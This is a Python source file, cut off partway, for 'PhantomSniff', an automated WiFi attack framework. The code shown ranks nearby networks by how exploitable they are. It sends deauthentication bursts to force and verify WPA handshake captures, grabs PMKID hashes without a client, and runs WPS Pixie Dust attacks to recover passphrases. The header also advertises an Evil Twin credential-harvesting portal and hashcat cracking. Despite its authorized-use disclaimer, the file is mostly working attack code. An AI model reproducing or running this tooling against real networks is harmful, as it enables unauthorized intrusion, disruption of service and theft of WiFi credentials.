#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 PhantomSniff v1.0.0 - Automated WiFi Penetration Testing Framework
=============================================================================

 An end-to-end WiFi security auditing orchestrator built around the standard
 open-source wireless toolchain (aircrack-ng suite, hcxtools, reaver/pixiewps,
 mdk4, hashcat, hostapd + dnsmasq, scapy).

 MODULES
   Recon      : monitor-mode management, airodump-ng CSV scanning, WPS (wash)
                detection, target scoring/ranking by signal + exploitability
   Attacks    : WPA/WPA2 handshake capture (deauth + EAPOL verification),
                clientless PMKID (hcxdumptool), WPS Pixie Dust (reaver),
                Evil Twin rogue AP with credential-verification portal,
                WEP ARP-replay, targeted/broadcast deauth
   Cracking   : hashcat 22000 (GPU auto-detect) with aircrack-ng CPU fallback,
                wordlist management (auto rockyou), rules, mask attacks
   Reporting  : JSON + dependency-free PDF export

 DESIGN NOTES (low-resource targets: Raspberry Pi / 2GB laptops)
   - Modular: only the selected attack module is instantiated and run.
   - Packet parsing streams with scapy PcapReader (constant RAM regardless
     of capture size); airodump-ng CSV is polled, never fully accumulated.
   - Thread/process pool sizes are derived from CPU cores AND MemAvailable.
   - External tools run detached (start_new_session) and are tracked for
     guaranteed cleanup.

 =============================================================================
 LEGAL NOTICE / AUTHORIZED USE ONLY
 =============================================================================
 This tool is provided for AUTHORIZED security auditing and education only.
 Attacking wireless networks without the owner's explicit written permission
 is ILLEGAL in most jurisdictions (CFAA, Computer Misuse Act, etc.). Every
 attack is gated behind an explicit authorization confirmation. You are
 solely responsible for your use of this software.
=============================================================================
"""

__version__ = "1.0.0"
__tool__ = "PhantomSniff"

import argparse
import glob
import gzip
import json
import logging
import os
import re
import shlex
import shutil
import signal
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import urllib.parse
import urllib.request
from collections import deque
from dataclasses import dataclass, field, asdict
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from string import Template

# ---------------------------------------------------------------------------
# Constants & defaults
# ---------------------------------------------------------------------------

DEFAULT_OUTDIR = os.path.join(os.getcwd(), "phantomsniff_output")

ROCKYOU_URLS = [
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
]

PORTAL_PORT = 8080
PORTAL_NET = "10.0.0.1/24"
GW = PORTAL_NET.split("/")[0]

DRIVER_MAP = {
    "ath9k": "Atheros AR9k (PCIe)", "ath9k_htc": "Atheros AR9271 (USB)",
    "ath10k": "Qualcomm Atheros ath10k", "carl9170": "Atheros AR9170",
    "rtl8187": "Realtek RTL8187", "rtl8xxxu": "Realtek RTL8xxx series",
    "r8188eu": "Realtek RTL8188EU", "88XXau": "Realtek RTL8812AU",
    "88x2bu": "Realtek RTL8812BU", "rtl8821cu": "Realtek RTL8821CU",
    "rt2800usb": "Ralink RT2x00/RT3x50/RT5372", "rt73usb": "Ralink RT73",
    "mt7601u": "MediaTek MT7601", "brcmfmac": "Broadcom (limited support)",
    "iwlwifi": "Intel (limited injection support)",
}

USB_VENDOR_MAP = {
    "0cf3": "Atheros", "0bda": "Realtek", "148f": "Ralink",
    "0e8d": "MediaTek", "13b1": "Linksys", "2001": "D-Link",
}

FIGLET = {
    "P": [" ____  ", "|  _ \\ ", "| |_) |", "|  __/ ", "|_|    "],
    "h": [" _     ", "| |__  ", "| '_ \\ ", "| | | |", "|_| |_|"],
    "a": ["       ", "  __ _ ", " / _` |", "| (_| |", " \\__,_|"],
    "n": ["       ", " _ __  ", "| '_ \\ ", "| | | |", "|_| |_|"],
    "t": [" _    ", "| |_  ", "| __| ", "| |_  ", " \\__| "],
    "o": ["       ", "  ___  ", " / _ \\ ", "| (_) |", " \\___/ "],
    "m": ["           ", " _ __ ___  ", "| '_ ` _ \\ ", "| | | | | |", "|_| |_| |_|"],
    "S": ["  ___   ", " / ___| ", " \\___ \\ ", "  ___) |", " |____/ "],
    "i": [" _ ", "(_)", "| |", "| |", "|_|"],
    "f": ["  __ ", " / / ", "| |  ", "| |  ", "|_|  "],
}


def build_banner(word=__tool__):
    """Compose the ASCII banner at runtime so letter columns align exactly."""
    rows = ["", "", "", "", ""]
    for ch in word:
        g = FIGLET.get(ch)
        if not g:
            continue
        for i in range(5):
            rows[i] += g[i] + " "
    return "\n".join(rows)


class PhantomError(Exception):
    """User-facing fatal error (clean message, no traceback)."""


class Color:
    ENABLED = True
    RESET = "\033[0m"
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    GRAY = "\033[90m"


def c(text, color):
    return color + str(text) + Color.RESET if Color.ENABLED else str(text)


class Log:
    """Timestamped logging: colored console (suppressed by --headless) + file."""
    _logger = None
    QUIET = False
    VERBOSE = False

    @classmethod
    def init(cls, path, quiet=False, verbose=False):
        cls.QUIET = quiet
        cls.VERBOSE = verbose
        logger = logging.getLogger("phantomsniff")
        logger.setLevel(logging.DEBUG)
        logger.propagate = False
        fh = logging.FileHandler(path)
        fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)-7s] %(message)s"))
        logger.addHandler(fh)
        cls._logger = logger

    @staticmethod
    def _emit(msg, color, level=logging.INFO, console=True):
        if Log._logger:
            Log._logger.log(level, msg)
        if console and not Log.QUIET:
            ts = time.strftime("%H:%M:%S")
            print(c(f"[{ts}]", Color.GRAY) + " " + c(msg, color), flush=True)

    @classmethod
    def info(cls, msg): cls._emit(msg, Color.WHITE)
    @classmethod
    def ok(cls, msg): cls._emit(msg, Color.GREEN)
    @classmethod
    def warn(cls, msg): cls._emit(msg, Color.YELLOW, logging.WARNING)
    @classmethod
    def err(cls, msg): cls._emit(msg, Color.RED, logging.ERROR)
    @classmethod
    def dbg(cls, msg): cls._emit(msg, Color.GRAY, logging.DEBUG, console=cls.VERBOSE)


def safe(s):
    """Sanitize untrusted strings (ESSIDs arrive off the air and may be binary)."""
    return "".join(ch if 32 <= ord(ch) < 127 else "?" for ch in (s or ""))


def hline(width=64, ch="-", color=Color.GRAY):
    print(c(ch * width, color), flush=True)


def sh(cmd, timeout=120, quiet=True):
    """Run a command to completion; returns (returncode, combined_output)."""
    Log.dbg("$ " + " ".join(shlex.quote(x) for x in cmd))
    try:
        cp = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, timeout=timeout, errors="replace")
        out = cp.stdout or ""
    except subprocess.TimeoutExpired:
        return 124, ""
    except FileNotFoundError:
        return 127, ""
    if not quiet and out:
        Log.dbg(out[:800])
    return cp.returncode, out


# ---------------------------------------------------------------------------
# Hardware-aware sizing (CPU cores + available RAM) for low-spec machines
# ---------------------------------------------------------------------------

def hw_threads():
    return os.cpu_count() or 1


def avail_ram_mb():
    try:
        with open("/proc/meminfo") as fh:
            for line in fh:
                if line.startswith("MemAvailable"):
                    return int(line.split()[1]) // 1024
    except (OSError, ValueError, IndexError):
        pass
    return 2048


def pool_size(override=None):
    """min(cores, RAM//256, 8): keeps 2GB Raspberry Pis responsive."""
    if override:
        return max(1, override)
    return max(1, min(hw_threads(), avail_ram_mb() // 256, 8))


# ---------------------------------------------------------------------------
# Dependency management
# ---------------------------------------------------------------------------

class DependencyManager:
    BINS = ["iw", "ip", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
            "hashcat", "hcxpcapngtool", "hcxdumptool", "reaver", "pixiewps",
            "mdk4", "hostapd", "dnsmasq", "wash", "iptables"]
    APT_MAP = {
        "airmon-ng": "aircrack-ng", "airodump-ng": "aircrack-ng",
        "aireplay-ng": "aircrack-ng", "aircrack-ng": "aircrack-ng",
        "hashcat": "hashcat", "hcxpcapngtool": "hcxtools",
        "hcxdumptool": "hcxtools", "reaver": "reaver", "wash": "reaver",
        "pixiewps": "pixiewps", "mdk4": "mdk4", "hostapd": "hostapd",
        "dnsmasq": "dnsmasq", "iw": "iw", "iptables": "iptables",
    }

    @classmethod
    def missing(cls):
        return [b for b in cls.BINS if not shutil.which(b)]

    @classmethod
    def scapy_ok(cls):
        try:
            import importlib.util
            return importlib.util.find_spec("scapy") is not None
        except Exception:
            return False

    @classmethod
    def install(cls, missing):
        """Best-effort install via apt/dnf/pacman + pip for scapy."""
        pkgs = sorted({cls.APT_MAP[b] for b in missing if b in cls.APT_MAP})
        sudo = [] if os.geteuid() == 0 else ["sudo"]
        try:
            if pkgs and shutil.which("apt-get"):
                env = dict(os.environ, DEBIAN_FRONTEND="noninteractive")
                Log.info("apt-get update ...")
                subprocess.run(sudo + ["apt-get", "update", "-y"], env=env, timeout=600)
                Log.info(f"apt-get install {pkgs}")
                subprocess.run(sudo + ["apt-get", "install", "-y"] + pkgs,
                               env=env, timeout=1200)
            elif pkgs and shutil.which("dnf"):
                subprocess.run(sudo + ["dnf", "install", "-y"] + pkgs, timeout=1200)
            elif pkgs and shutil.which("pacman"):
                subprocess.run(sudo + ["pacman", "-S", "--noconfirm"] + pkgs, timeout=1200)
            else:
                Log.warn("no supported package manager; install tools manually (see README)")
        except Exception as e:
            Log.err(f"dependency install failed: {e}")
        if not cls.scapy_ok():
            Log.info("pip install scapy ...")
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", "--user",
                                "scapy"], timeout=600)
            except Exception as e:
                Log.warn(f"pip install failed: {e}")


# ---------------------------------------------------------------------------
# Interface management: detection, chipset ID, monitor mode, restore
# ---------------------------------------------------------------------------

class InterfaceManager:

    @staticmethod
    def list_adapters():
        """Parse `iw dev` (phy#N headers precede Interface blocks)."""
        rc, out = sh(["iw", "dev"], timeout=15)
        adapters, pending_phy, cur = [], "", None
        for raw in out.splitlines():
            line = raw.strip()
            m = re.match(r"^phy#(\d+)$", line)
            if m:
                cur = None
                pending_phy = m.group(1)
                continue
            m = re.match(r"^Interface\s+(\S+)$", line)
            if m:
                cur = {"name": m.group(1), "phy": pending_phy,
                       "addr": "", "type": "", "channel": 0}
                adapters.append(cur)
                continue
            if cur is None:
                continue
            m = re.search(r"addr\s+([0-9a-f:]{17})", line)
            if m:
                cur["addr"] = m.group(1)
                continue
            m = re.search(r"\btype\s+(\S+)", line)
            if m:
                cur["type"] = m.group(1)
                continue
            m = re.search(r"channel\s+(\d+)", line)
            if m:
                cur["channel"] = int(m.group(1))
        return adapters

    @staticmethod
    def get_type(iface):
        rc, out = sh(["iw", "dev", iface, "info"], timeout=15)
        m = re.search(r"type\s+(\S+)", out)
        return m.group(1) if m else ""

    @staticmethod
    def mac_of(iface):
        rc, out = sh(["ip", "-o", "link", "show", "dev", iface], timeout=10)
        m = re.search(r"link/ether\s+([0-9a-f:]{17})", out)
        if m:
            return m.group(1)
        try:
            from scapy.arch import get_if_hwaddr
            return get_if_hwaddr(iface)
        except Exception:
            return "00:00:00:00:00:00"

    @staticmethod
    def chipset(iface):
        """Chipset via kernel driver name, falling back to lsusb vendor IDs."""
        try:
            path = os.path.realpath(os.path.join("/sys/class/net", iface,
                                                 "device", "driver"))
            if path and os.path.basename(path) and os.path.basename(path) != "driver":
                drv = os.path.basename(path)
                return DRIVER_MAP.get(drv, drv)
        except Exception:
            pass
        rc, out = sh(["lsusb"], timeout=10)
        for line in out.splitlines():
            m = re.search(r"([0-9a-f]{4}):([0-9a-f]{4})", line)
            if m:
                return USB_VENDOR_MAP.get(m.group(1), "USB " + m.group(0))
        return "unknown"

    @classmethod
    def supports_monitor(cls, iface):
        for a in cls.list_adapters():
            if a["name"] == iface and a["phy"] != "":
                rc, out = sh(["iw", "phy", f"phy{a['phy']}", "info"], timeout=15)
                return "* monitor" in out
        return False

    @classmethod
    def enable_monitor(cls, orig, use_airmon=True):
        """Enable monitor mode. airmon-ng is preferred because it handles
        process conflicts (NetworkManager etc.) and interface renaming; the
        manual path is ip down -> iw set type monitor -> ip up."""
        if cls.get_type(orig) == "monitor":
            return orig
        sh(["rfkill", "unblock", "wifi"], timeout=10)
        before = {a["name"] for a in cls.list_adapters()}
        mon = None
        if use_airmon and shutil.which("airmon-ng"):
            Log.info(f"airmon-ng start {orig} ...")
            rc, out = sh(["airmon-ng", "start", orig], timeout=90)
            Log.dbg(out[-400:])
            mons = [a["name"] for a in cls.list_adapters() if a["type"] == "monitor"]
            new = [m for m in mons if m not in before]
            mon = new[0] if new else (mons[0] if mons else None)
        if not mon:
            Log.info(f"manual monitor-mode switch on {orig}")
            sh(["ip", "link", "set", orig, "down"], timeout=10)
            sh(["iw", "dev", orig, "set", "type", "monitor"], timeout=10)
            sh(["ip", "link", "set", orig, "up"], timeout=10)
            if cls.get_type(orig) == "monitor":
                mon = orig
        if mon:
            Log.ok(f"monitor mode enabled on {c(mon, Color.CYAN)}")
            return mon
        raise PhantomError(
            f"could not enable monitor mode on {orig}; the chipset likely "
            "lacks support (see README supported-adapters list)")

    @classmethod
    def disable_monitor(cls, mon):
        """Restore managed mode; returns the resulting managed iface name."""
        if not mon:
            return None
        if shutil.which("airmon-ng") and mon.endswith("mon"):
            Log.info(f"airmon-ng stop {mon}")
            sh(["airmon-ng", "stop", mon], timeout=60)
            for a in cls.list_adapters():
                if a["type"] != "monitor" and a["name"]:
                    Log.ok(f"{a['name']} restored to managed mode")
                    return a["name"]
            return None
        sh(["ip", "link", "set", mon, "down"], timeout=10)
        sh(["iw", "dev", mon, "set", "type", "managed"], timeout=10)
        sh(["ip", "link", "set", mon, "up"], timeout=10)
        Log.ok(f"{mon} restored to managed mode")
        return mon

    @staticmethod
    def kill_managers():
        """airmon-ng check kill stops NetworkManager/wpa_supplicant/avahi which
        otherwise fight over channel hopping and break attacks."""
        if shutil.which("airmon-ng"):
            Log.warn("running 'airmon-ng check kill' (stops network managers)")
            sh(["airmon-ng", "check", "kill"], timeout=90)
        else:
            for name in ("NetworkManager", "wpa_supplicant", "avahi-daemon"):
                sh(["pkill", "-x", name], timeout=10)

    @staticmethod
    def restore_managers():
        for svc in ("NetworkManager", "wpa_supplicant"):
            if shutil.which("systemctl") and sh(["systemctl", "restart", svc],
                                                timeout=60)[0] == 0:
                Log.ok(f"restarted {svc}")
                return
        Log.dbg("network managers not restarted (non-systemd system?)")


# ---------------------------------------------------------------------------
# Network model + target scoring
# ---------------------------------------------------------------------------

@dataclass
class Network:
    bssid: str = ""
    essid: str = "<hidden>"
    channel: int = 0
    privacy: str = ""
    cipher: str = ""
    auth: str = ""
    power: int = -100
    beacons: int = 0
    ivs: int = 0
    wps: bool = False
    wps_locked: bool = False
    clients: set = field(default_factory=set)

    def to_dict(self):
        d = asdict(self)
        d["clients"] = sorted(self.clients)
        d["score"] = self.score()
        return d

    def score(self):
        """Vulnerability-likelihood score 0-100: signal strength weighted with
        encryption risk (WEP easy, WPS-enabled high, WPA3-only penalized)."""
        sig = 0 if self.power <= -90 else min(100, max(0, (self.power + 100) * 2))
        s = sig * 0.4
        pr = (self.privacy or "").upper()
        if "WEP" in pr:
            s += 40
        if self.wps:
            s += 35 if not self.wps_locked else 10
        if "WPA3" in pr and "WPA2" not in pr:
            s -= 20
        if pr.startswith("OPN") or pr == "OPEN":
            s -= 5
        s += min(len(self.clients), 5) * 2
        s += min(self.beacons / 1000, 10)
        return round(max(0, min(100, s)), 1)

    @staticmethod
    def recommend(net):
        """Ordered attack plan: PMKID first (clientless) for WPA networks."""
        pr = (net.privacy or "").upper()
        if "WEP" in pr:
            return ["wep", "handshake"]
        if net.wps:
            return ["wps", "pmkid", "handshake"]
        return ["pmkid", "handshake", "eviltwin"]


def parse_airodump_csv(text):
    """Parse an airodump-ng CSV (AP section, then station section). ESSID spans
    fields 13..-1 because SSIDs may contain commas."""
    nets = {}
    mac_re = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
    mode = None
    for raw in text.splitlines():
        line = raw.strip()
        if line.startswith("BSSID"):
            mode = "ap"
            continue
        if line.startswith("Station MAC"):
            mode = "st"
            continue
        if not line:
            continue
        f = [x.strip() for x in line.split(",")]
        if mode == "ap" and len(f) >= 15 and mac_re.match(f[0]):
            essid = ", ".join(f[13:-1]).strip() if len(f) > 14 else ""
            if essid.startswith("<length"):
                essid = "<hidden>"
            power = int(f[8]) if re.match(r"^-?\d+$", f[8]) else -100
            ch = int(f[3]) if f[3].isdigit() else 0
            nets[f[0].lower()] = Network(
                bssid=f[0].lower(), essid=essid or "<hidden>", channel=ch,
                privacy=f[5], cipher=f[6], auth=f[7], power=power,
                beacons=int(f[9] or 0), ivs=int(f[10] or 0))
        elif mode == "st" and len(f) >= 6 and mac_re.match(f[0]) and mac_re.match(f[5]):
            b = f[5].lower()
            nets.setdefault(b, Network(bssid=b)).clients.add(f[0])
    return nets


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class Scanner:
    """airodump-ng CSV polling - streamed and low-RAM: only the parsed result
    set is ever held in memory, not the raw packet stream."""

    def __init__(self, ctx):
        self.ctx = ctx

    def scan(self, iface, seconds, channel=None, band="abg"):
        tmp = tempfile.mkdtemp(prefix="ps_scan_")
        prefix = os.path.join(tmp, "scan")
        cmd = ["airodump-ng", "--output-format", "csv", "--write-interval", "2",
               "-w", prefix]
        if channel:
            cmd += ["-c", str(channel)]
        else:
            cmd += ["--band", band]
        cmd += [iface]
        p = self.ctx.popen(cmd, outfile=os.path.join(tmp, "airodump.log"))
        nets = {}
        end = time.monotonic() + seconds
        try:
            while time.monotonic() < end:
                time.sleep(2)
                csvs = sorted(glob.glob(prefix + "*.csv"), key=os.path.getmtime)
                if csvs:
                    try:
                        with open(csvs[-1], errors="replace") as fh:
                            nets = parse_airodump_csv(fh.read())
                    except OSError:
                        pass
        finally:
            self.ctx.kill_proc(p)
        self.wps_enrich(iface, nets, seconds=min(20, max(8, seconds // 3)))
        return nets

    def wps_enrich(self, iface, nets, seconds=15):
        """Flag WPS-capable APs: reaver's `wash` first; scapy vendor-IE sniff
        (OUI 00:50:F2 / type 0x04) as fallback."""
        if shutil.which("wash"):
            tmp = tempfile.mkdtemp(prefix="ps_wash_")
            p = self.ctx.popen(["wash", "-i", iface, "-C", "-a"],
                               outfile=os.path.join(tmp, "wash.log"))
            time.sleep(seconds)
            self.ctx.kill_proc(p)
            try:
                with open(os.path.join(tmp, "wash.log"), errors="replace") as fh:
                    for line in fh:
                        toks = line.split(None, 5)
                        if len(toks) >= 6 and re.match(r"^([0-9A-Fa-f]{2}:){5}", toks[0]):
                            b = toks[0].lower()
                            n = nets.setdefault(b, Network(bssid=b))
                            n.wps = True
                            n.wps_locked = toks[4].lower() in ("yes", "1")
            except OSError:
                pass
        else:
            self._scapy_wps_scan(iface, nets, seconds)

    def _scapy_wps_scan(self, iface, nets, seconds=15):
        try:
            from scapy.all import sniff
            from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
        except Exception as e:
            Log.warn(f"scapy WPS fallback unavailable ({e}); WPS column may be empty")
            return
        stop = threading.Event()

        def hopper():
            chans, i = [1, 6, 11, 3, 9, 5, 13], 0
            while not stop.is_set():
                sh(["iw", "dev", iface, "set", "channel", str(chans[i % len(chans)])],
                   timeout=5)
                time.sleep(2)
                i += 1

        t = threading.Thread(target=hopper, daemon=True)
        t.start()

        def cb(pkt):
            try:
                if not pkt.haslayer(Dot11Beacon):
                    return
                d = pkt[Dot11]
                b = (d.addr3 or "").lower()
                if not b:
                    return
                el = pkt.getlayer(Dot11Elt)
                essid, wps = "", False
                while isinstance(el, Dot11Elt):
                    if el.ID == 0:
                        essid = (el.info or b"").decode("utf-8", "replace")
                    if el.ID == 221 and el.info and el.info[:4] == b"\x00\x50\xf2\x04":
                        wps = True
                    el = el.payload
                n = nets.setdefault(b, Network(bssid=b, essid=essid or "<hidden>"))
                n.wps = n.wps or wps
            except Exception:
                pass

        try:
            sniff(iface=iface, timeout=seconds, prn=cb, store=False)  # store=False: low RAM
        except Exception as e:
            Log.warn(f"scapy sniff failed: {e}")
        stop.set()
        time.sleep(0.2)

    @staticmethod
    def print_table(nets):
        ordered = sorted(nets.values(), key=lambda n: (-n.score(), -n.power))
        hdr = "{:>3}  {:<24} {:<17} {:>3}  {:<14} {:>4} {:>4}  {:>4}  {:>5}".format(
            "#", "ESSID", "BSSID", "CH", "ENCRYPTION", "PWR", "CLI", "WPS", "SCORE")
        hline()
        print(c(hdr, Color.WHITE))
        hline()
        for i, n in enumerate(ordered):
            print("{:>3}  {:<24} {:<17} {:>3}  {:<14} {:>4} {:>4}  {:>4}  {:>5}".format(
                i, safe(n.essid)[:24], n.bssid, n.channel or "-",
                safe(n.privacy)[:14], n.power if n.power > -90 else "-",
                len(n.clients), "Y" if n.wps else "-", n.score()))
        hline()
        return ordered


# ---------------------------------------------------------------------------
# Handshake integrity verification (scapy PcapReader streaming)
# ---------------------------------------------------------------------------

def eapol_msg_type(raw):
    """Classify an EAPOL-Key frame as 4-way handshake message 1-4.
    raw[0]=version, raw[1]=type (3 = EAPOL-Key), raw[5:7]=Key Information:
      M1: ACK(0x80) set, MIC(0x100) clear
      M2: MIC set, ACK clear, SECURE(0x200) clear
      M3: MIC set, ACK set, SECURE set
      M4: MIC set, ACK clear, SECURE set
    """
    if len(raw) < 7 or raw[1] != 3:
        return 0
    ki = int.from_bytes(raw[5:7], "big")
    ack, mic, sec = ki & 0x80, ki & 0x100, ki & 0x200
    if ack and not mic:
        return 1
    if mic and not ack and not sec:
        return 2
    if mic and ack and sec:
        return 3
    if mic and not ack and sec:
        return 4
    return 0


def verify_handshake(cap_path, bssid=None):
    """Stream the .cap file with scapy's PcapReader (constant memory) and look
    for a complete EAPOL exchange (M1+M2, M2+M3 or M3+M4)."""
    try:
        from scapy.all import PcapReader
        from scapy.layers.dot11 import Dot11
        from scapy.layers.eap import EAPOL
    except ImportError:
        ok = os.path.exists(cap_path) and os.path.getsize(cap_path) > 1000
        return ok, "scapy unavailable - file-size heuristic only" if ok else "no capture"
    pairs, n_eapol = {}, 0
    try:
        with PcapReader(cap_path) as pr:
            for pkt in pr:
                if not pkt.haslayer(EAPOL):
                    continue
                n_eapol += 1
                d11 = pkt.getlayer(Dot11)
                ap, cl = d11.addr2, d11.addr1
                if not ap or not cl:
                    continue
                if bssid and ap.lower() != bssid.lower():
                    continue
                mt = eapol_msg_type(bytes(pkt[EAPOL]))
                if mt:
                    pairs.setdefault((ap.lower(), cl.lower()), set()).add(mt)
    except Exception as e:
        return False, f"capture unreadable: {e}"
    for (ap, cl), msgs in pairs.items():
        if (1 in msgs and 2 in msgs) or (2 in msgs and 3 in msgs) or \
                (3 in msgs and 4 in msgs):
            return True, f"complete EAPOL msgs {sorted(msgs)} ap={ap} client={cl}"
    if n_eapol:
        return False, f"{n_eapol} EAPOL frames seen, none complete"
    return False, "no EAPOL frames found"


# ---------------------------------------------------------------------------
# Attack modules
# ---------------------------------------------------------------------------

class Attack:
    """Base class. Each attack runs in its own workdir and returns:
    {success, type, target, essid, detail, cap, hash22000, password}."""
    KEY = "base"
    LABEL = "Base"
    DESC = ""
    REQUIRES = []

    def __init__(self, ctx, net, workdir, client=None):
        self.ctx = ctx
        self.net = net
        self.b = net.bssid
        self.ch = net.channel or 1
        self.workdir = workdir
        self.client = client
        self.iface = ctx.iface

    def result(self, ok, **kw):
        r = {"success": bool(ok), "type": self.KEY, "target": self.b,
             "essid": safe(self.net.essid), "detail": kw.pop("detail", ""),
             "cap": kw.pop("cap", None), "hash22000": kw.pop("hash22000", None),
             "password": kw.pop("password", None)}
        r.update(kw)
        return r

    def run(self):
        raise NotImplementedError


class HandshakeAttack(Attack):
    """WPA/WPA2 4-way handshake capture. Airodump-ng is channel- and BSSID-
    locked on the target; deauth bursts (aireplay-ng -0, mdk4 fallback) force
    clients to reassociate so they replay EAPOL M1-M4, recorded to the .cap
    file. Capture integrity is verified by streaming the file with scapy and
    classifying EAPOL Key frames until a valid M1+M2 / M2+M3 / M3+M4 pair
    exists. Only then is the capture auto-saved as a verified handshake."""
    KEY = "handshake"
    LABEL = "WPA/WPA2 handshake capture"
    DESC = "deauth clients (aireplay-ng/mdk4), capture + verify EAPOL M1-M4"
    REQUIRES = ["airodump-ng", "aireplay-ng"]

    def run(self, timeout=None, attempts=None):
        timeout = timeout or self.ctx.args.hs_timeout
        attempts = attempts or self.ctx.args.deauth_rounds
        prefix = os.path.join(self.workdir, "hs")
        p = self.ctx.popen(
            ["airodump-ng", "-c", str(self.ch), "--bssid", self.b, "-w", prefix,
             "--output-format", "pcap", self.iface],
            outfile=os.path.join(self.workdir, "airodump.log"))
        cap, ok, detail = None, False, ""
        try:
            for _ in range(20):
                time.sleep(0.5)
                caps = glob.glob(prefix + "-0*.cap")
                if caps:
                    cap = caps[0]
                    break
            if not cap:
                return self.result(False, detail="airodump-ng created no capture file")
            Log.info(f"locked capture on ch{self.ch}; waiting for handshake "
                     f"(max {timeout}s, {attempts} deauth rounds)")
            deadline = time.monotonic() + timeout
            for i in range(attempts):
                if time.monotonic() > deadline:
                    break
                if i:
                    Log.info(f"deauth burst {i + 1}/{attempts}")
                    if shutil.which("aireplay-ng"):
                        cmd = ["aireplay-ng", "-0", str(self.ctx.args.deauth_count),
                               "--ignore-negative-one", "-a", self.b]
                        if self.client:
                            cmd += ["-c", self.client]
                        sh(cmd + [self.iface], timeout=30)
                    elif shutil.which("mdk4"):
                        cmd = ["mdk4", self.iface, "d", "-B", self.b]
                        if self.client:
                            cmd += ["-c", self.client]
                        sh(cmd, timeout=15)
                    else:
                        Log.warn("no deauth injector available; waiting passively")
                t0 = time.monotonic()
                while time.monotonic() - t0 < 10:
                    ok, detail = verify_handshake(cap, self.b)
                    if ok:
                        break
                    time.sleep(1)
                if ok:
                    break
        finally:
            self.ctx.kill_proc(p)
        if ok:
            final = os.path.join(self.ctx.outdir, "caps", "handshake_{}_{}.cap".format(
                safe(self.net.essid).replace(" ", "_"), self.b.replace(":", "")))
            shutil.copy2(cap, final)
            Log.ok("handshake verified: " + detail)
            return self.result(True, cap=final, detail=detail)
        return self.result(False, detail=detail or "no handshake captured")


class PMKIDAttack(Attack):
    """Clientless PMKID. During roaming/reconnect an AP may include the RSN
    PMKID (an HMAC of the PMK) unauthenticated in its first EAPOL frame.
    hcxdumptool records such frames; hcxpcapngtool converts them to hashcat
    mode 22000 (WPM lines). No client or deauthentication is required."""
    KEY = "pmkid"
    LABEL = "PMKID capture (clientless)"
    DESC = "hcxdumptool + hcxpcapngtool -> hashcat 22000, no deauth needed"
    REQUIRES = ["hcxdumptool", "hcxpcapngtool"]

    def run(self, timeout=None):
        timeout = timeout or self.ctx.args.pmkid_timeout
        if not shutil.which("hcxdumptool"):
            return self.result(False, detail="hcxdumptool not installed")
        dump = os.path.join(self.workdir, "pmkid.pcapng")
        hashf = os.path.join(self.workdir, "hash.22000")
        rc, out = sh(["hcxdumptool", "--help"], timeout=10)
        cmd = ["hcxdumptool", "-i", self.iface, "-o", dump]
        if "enable_status" in out:  # flag varies across hcxdumptool versions
            cmd += ["--enable_status=1"]
        p = self.ctx.popen(cmd, outfile=os.path.join(self.workdir, "hcxdump.log"))
        try:
            time.sleep(timeout)
        finally:
            p.send_signal(signal.SIGINT)  # hcxdumptool flushes on SIGINT
            time.sleep(5)
            self.ctx.kill_proc(p)
        if not os.path.exists(dump):
            return self.result(False, detail="hcxdumptool produced no dump "
                                              "(driver/rfkill issue?)")
        sh(["hcxpcapngtool", "-o", hashf, dump], timeout=180)
        if not os.path.exists(hashf):
            return self.result(False, detail="hcxpcapngtool found no hashes")
        target_hash, any_hash = None, 0
        with open(hashf, errors="replace") as fh:
            for line in fh:
                f = line.strip().split("*")
                if len(f) >= 4 and f[0] in ("WPA", "WPM"):
                    any_hash += 1
                    if f[2].lower() == self.b.lower():
                        target_hash = line.strip()
        if target_hash:
            final = os.path.join(self.ctx.outdir, "hashes",
                                 "pmkid_{}.22000".format(self.b.replace(":", "")))
            shutil.copy2(hashf, final)
            Log.ok(f"PMKID captured for {self.b}")
            return self.result(True, hash22000=final, detail="PMKID -> hashcat 22000")
        Log.warn(f"target PMKID not present; {any_hash} hash(es) captured for "
                 "other APs (saved) - retry with a longer --pmkid-timeout")
        return self.result(False, hash22000=hashf if any_hash else None,
                           detail=f"{any_hash} hashes for other APs")


class WPSPixieAttack(Attack):
    """WPS Pixie Dust (one-shot). reaver -K 1 performs a single WPS enrollee
    exchange and feeds the AP's E-S1/E-S2 nonce data to pixiewps, which
    computes the PIN offline from weak PRNG seeds; the derived pin then yields
    the WPA passphrase. Entirely unauthenticated - no client required."""
    KEY = "wps"
    LABEL = "WPS Pixie Dust (one-shot)"
    DESC = "reaver -K 1 + pixiewps; PSK from vulnerable WPS implementations"
    REQUIRES = ["reaver", "pixiewps"]

    def run(self, timeout=None):
        timeout = timeout or self.ctx.args.wps_timeout
        if not shutil.which("reaver"):
            return self.result(False, detail="reaver not installed")
        if not shutil.which("pixiewps"):
            Log.warn("pixiewps missing - Pixie Dust cannot run")
            return self.result(False, detail="pixiewps not installed")
        Log.info(f"running Pixie Dust against {self.b} (up to {timeout}s)...")
        cmd = ["reaver", "-i", self.iface, "-b", self.b, "-c", str(self.ch),
               "-K", "1", "-vv", "-N", "-L"]
        rc, out = sh(cmd, timeout=timeout)
        with open(os.path.join(self.workdir, "reaver.log"), "w", errors="replace") as fh:
            fh.write(out)
        m = re.search(r"WPA PSK:\s*'?([^'\n\r]+)'?", out)
        if m:
            pw = m.group(1).strip()
            Log.ok("WPS Pixie Dust succeeded!")
            return self.result(True, password=pw, detail="PSK recovered via pixiewps")
        for pat in (r"ap is (?:locked|not vulnerable)", r"WPS transaction failed",
                    r"PixieDust attack.*failed"):
            if re.search(pat, out, re.I):
